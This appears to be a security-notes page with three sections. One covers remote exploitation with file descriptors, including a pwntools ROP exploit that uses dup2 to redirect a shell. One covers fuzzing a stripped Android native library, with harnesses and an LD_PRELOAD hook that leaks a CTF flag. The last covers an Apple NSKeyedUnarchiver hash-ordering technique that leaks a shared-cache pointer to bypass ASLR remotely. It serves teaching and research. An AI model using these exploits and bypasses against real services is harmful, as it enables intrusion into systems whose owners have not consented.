## FDs in Remote Exploitation

When sending an exploit to a remote server that calls **`system('/bin/sh')`** for example, this will be executed in the server process ofc, and `/bin/sh` will expect input from stdin (FD: `0`) and will print the output in stdout and stderr (FDs `1` and `2`). So the attacker won't be able to interact with the shell.

A way to fix this is to suppose that when the server started it created the **FD number `3`** (for listening) and that then, your connection is going to be in the **FD number `4`**. Therefore, it's possible to use the syscall **`dup2`** to duplicate the stdin (FD 0) and the stdout (FD 1) in the FD 4 (the one of the connection of the attacker) so it'll make feasible to contact the shell once it's executed.

[**Exploit example from here**](https://ir0nstone.gitbook.io/notes/types/stack/exploiting-over-sockets/exploit):

```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = remote('localhost', 9001)

rop = ROP(elf)
rop.raw('A' * 40)
rop.dup2(4, 0)
rop.dup2(4, 1)
rop.win()

p.sendline(rop.chain())
p.recvuntil('Thanks!\x00')
p.interactive()
```

## Socat & pty

Note that socat already transfers **`stdin`** and **`stdout`** to the socket. However, the `pty` mode **include DELETE characters**. So, if you send a `\x7f` ( `DELETE` -)it will **delete the previous character** of your exploit.

In order to bypass this the **escape character `\x16` must be prepended to any `\x7f` sent.**

**Here you can** [**find an example of this behaviour**](https://ir0nstone.gitbook.io/hackthebox/challenges/pwn/dream-diary-chapter-1/unlink-exploit)**.**

## Android AArch64 shared-library fuzzing & LD_PRELOAD hooking

When an Android app ships only a stripped AArch64 `.so`, you can still fuzz exported logic directly on-device without rebuilding the APK. A practical workflow:

1. **Locate callable entry points.** `objdump -T libvalidate.so | grep -E "validate"` quickly lists exported functions. Decompilers (Ghidra, IDA, BN) reveal the real signature, e.g. `int validate(const uint8_t *buf, uint64_t len)`.
2. **Write a standalone harness.** Load a file, keep the buffer alive, and call the exported symbol exactly as the app would. Cross-compile with the NDK (e.g. `aarch64-linux-android21-clang harness.c -L. -lvalidate -fPIE -pie`).

<details>
<summary>Minimal file-driven harness</summary>

```c
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>

extern int validate(const uint8_t *buf, uint64_t len);

int main(int argc, char **argv) {
    if (argc < 2) return 1;
    int fd = open(argv[1], O_RDONLY);
    if (fd < 0) return 1;
    struct stat st = {0};
    if (fstat(fd, &st) < 0) return 1;
    uint8_t *buffer = malloc(st.st_size + 1);
    read(fd, buffer, st.st_size);
    close(fd);
    int ret = validate(buffer, st.st_size);
    free(buffer);
    return ret;
}
```

</details>

3. **Reconstruct the expected structure.** Error strings and comparisons in Ghidra showed the function parsed strict JSON with constant keys (`magic`, `version`, nested `root.children.*`) and arithmetic checks (e.g., `value * 2 == 84` ⇒ `value` must be `42`). Feeding syntactically valid JSON that progressively satisfies each branch lets you map the schema without instrumentation.
4. **Bypass anti-debug to leak secrets.** Because the `.so` imports `snprintf`, override it with `LD_PRELOAD` to dump sensitive format strings even when breakpoints are blocked:

<details>
<summary>Minimal snprintf leak hook</summary>

```c
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdarg.h>
#include <stdio.h>
#include <string.h>

typedef int (*vsnprintf_t)(char *, size_t, const char *, va_list);

int snprintf(char *str, size_t size, const char *fmt, ...) {
    static vsnprintf_t real_vsnprintf;
    if (!real_vsnprintf)
        real_vsnprintf = (vsnprintf_t)dlsym(RTLD_NEXT, "vsnprintf");

    va_list args;
    va_start(args, fmt);
    va_list args_copy;
    va_copy(args_copy, args);
    if (fmt && strstr(fmt, "MHL{")) {
        fprintf(stdout, "[LD_PRELOAD] flag: ");
        vfprintf(stdout, fmt, args);
        fputc('\n', stdout);
    }
    int ret = real_vsnprintf(str, size, fmt, args_copy);
    va_end(args_copy);
    va_end(args);
    return ret;
}
```

</details>

`LD_PRELOAD=./hook.so ./validate_harness payload.json` exfiltrates the internal flag and confirms the crash oracle without patching the binary.
5. **Shrink the fuzz space.** Disassembly exposed an XOR key reused across the flag comparison, meaning the first seven bytes of `flag` were known. Only fuzz the nine unknown bytes.
6. **Embed fuzz bytes inside a valid JSON envelope.** The AFL harness reads exactly nine bytes from `stdin`, copies them into the flag suffix, and hard-codes every other field (constants, tree depths, arithmetic preimage). Any malformed read simply exits, so AFL spends cycles on meaningful testcases:

<details>
<summary>Minimal AFL harness</summary>

```c
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

extern int validate(unsigned char *bytes, size_t len);

#define FUZZ_SIZE 9

int main(void) {
    uint8_t blob[FUZZ_SIZE];
    if (read(STDIN_FILENO, blob, FUZZ_SIZE) != FUZZ_SIZE) return 0;
    char suffix[FUZZ_SIZE + 1];
    memcpy(suffix, blob, FUZZ_SIZE);
    suffix[FUZZ_SIZE] = '\0';
    char json[512];
    int len = snprintf(json, sizeof(json),
        "{\"magic\":16909060,\"version\":1,\"padding\":0,\"flag\":\"MHL{827b07c%s}\"," \
        "\"root\":{\"type\":16,\"level\":3,\"num_children\":1,\"children\":[" \
        "{\"type\":32,\"level\":2,\"num_children\":1,\"subchildren\":[" \
        "{\"type\":48,\"level\":1,\"num_children\":1,\"leaves\":[" \
        "{\"type\":64,\"level\":0,\"reserved\":0,\"value\":42}]}}]}}",
        suffix);
    if (len <= 0 || (size_t)len >= sizeof(json)) return 0;
    validate((unsigned char *)json, len);
    return 0;
}
```

</details>

7. **Run AFL with the crash-as-success oracle.** Any input that satisfies every semantic check and guesses the correct nine-byte suffix triggers the deliberate crash; those files land in `output/crashes` and can be replayed through the simple harness to recover the secret.

This workflow lets you triage anti-debug-protected JNI validators quickly, leak secrets when needed, then fuzz only the meaningful bytes, all without touching the original APK.

## Pointer-Keyed Hash Table Pointer Leaks on Apple Serialization

### Requirements & attack surface

- A service accepts attacker-controlled property lists (XML or binary) and calls `NSKeyedUnarchiver.unarchivedObjectOfClasses` with a permissive allowlist (e.g., `NSDictionary`, `NSArray`, `NSNumber`, `NSString`, `NSNull`).
- The resulting objects are reused and later serialized again with `NSKeyedArchiver` (or iterated in deterministic bucket order) and sent back to the attacker.
- Some key type in the containers uses pointer values as its hash code. Before March 2025, `CFNull`/`NSNull` fell back to `CFHash(object) == (uintptr_t)object`, and deserialization always returned the shared-cache singleton `kCFNull`, giving a stable kernel-shared pointer without memory corruption or timing.

### Controllable hashing primitives

- **Pointer-based hashing:** `CFNull`’s `CFRuntimeClass` lacks a hash callback, so `CFBasicHash` uses the object address as the hash. Because the singleton lives at a fixed shared-cache address until reboot, its hash is stable across processes.
- **Attacker-controlled hashes:** 32-bit `NSNumber` keys are hashed through `_CFHashInt`, which is deterministic and attacker-controllable. Picking specific integers lets the attacker choose `hash(number) % num_buckets` for any table size.
- **`NSDictionary` implementation:** Immutable dictionaries embed a `CFBasicHash` with a prime bucket count chosen from `__CFBasicHashTableSizes` (e.g., 23, 41, 71, 127, 191, 251, 383, 631, 1087). Collisions are handled with linear probing (`__kCFBasicHashLinearHashingValue`), and serialization walks buckets in numeric order; therefore, the order of serialized keys encodes the bucket index that each key finally occupied.

### Encoding bucket indices into serialization order

By crafting a plist that materializes a dictionary whose buckets alternate between occupied and empty slots, the attacker constrains where linear probing can place `NSNull`. For a 7-bucket example, filling even buckets with `NSNumber` keys produces:

```text
bucket:          0 1 2 3 4 5 6
occupancy:       # _ # _ # _ #
```

During deserialization the victim inserts the single `NSNull` key. Its initial bucket is `hash(NSNull) % 7`, but probing advances until hitting one of the open indices {1,3,5}. The serialized key order reveals which slot was used, disclosing whether the pointer hash modulo 7 lies in {6,0,1}, {2,3}, or {4,5}. Because the attacker controls the original serialized order, the `NSNull` key is emitted last in the input plist so the post-reserialization ordering is solely a function of bucket placement.

### Resolving exact residues with complementary tables

A single dictionary only leaks a range of residues. To determine the precise value of `hash(NSNull) % p`, build **two** dictionaries per prime bucket size `p`: one with even buckets pre-filled and one with odd buckets pre-filled. For the complementary pattern (`_ # _ # _ # _`), the empty slots (0,2,4,6) map to residue sets {0}, {1,2}, {3,4}, {5,6}. Observing the serialized position of `NSNull` in both dictionaries narrows the residue to a single value because the intersection of the two candidate sets yields a unique `r_i` for that `p`.

The attacker bundles all dictionaries inside an `NSArray`, so a single deserialize → serialize round trip leaks residues for every chosen table size.

### Reconstructing the 64-bit shared-cache pointer

For each prime `p_i ∈ {23, 41, 71, 127, 191, 251, 383, 631, 1087}`, the attacker recovers `hash(NSNull) ≡ r_i (mod p_i)` from the serialized ordering. Applying the Chinese Remainder Theorem (CRT) with the extended Euclidean algorithm yields:

```text
Π p_i = 23·41·71·127·191·251·383·631·1087 = 0x5ce23017b3bd51495 > 2^64
```

so the combined residue uniquely equals the 64-bit pointer to `kCFNull`. The Project Zero PoC iteratively combines congruences while printing intermediate moduli to show convergence toward the true address (`0x00000001eb91ab60` on the vulnerable build).

### Practical workflow

1. **Generate crafted input:** Build the attacker-side XML plist (two dictionaries per prime, `NSNull` serialized last) and convert it to binary format.
   ```bash
   clang -o attacker-input-generator attacker-input-generator.c
   ./attacker-input-generator > attacker-input.plist
   plutil -convert binary1 attacker-input.plist
   ```
2. **Victim round trip:** The victim service deserializes with `NSKeyedUnarchiver.unarchivedObjectOfClasses` using the allowed classes set `{NSDictionary, NSArray, NSNumber, NSString, NSNull}` and immediately re-serializes with `NSKeyedArchiver`.
3. **Residue extraction:** Converting the returned plist back to XML reveals the dictionary key ordering. A helper such as `extract-pointer.c` reads the object table, determines the index of the singleton `NSNull`, maps each dictionary pair back to its bucket residue, and solves the CRT system to recover the shared-cache pointer.
4. **Verification (optional):** Compiling a tiny Objective-C helper that prints `CFHash(kCFNull)` confirms the leaked value matches the real address.

No memory safety bug is required—simply observing serialization order of pointer-keyed structures yields a remote ASLR bypass primitive.
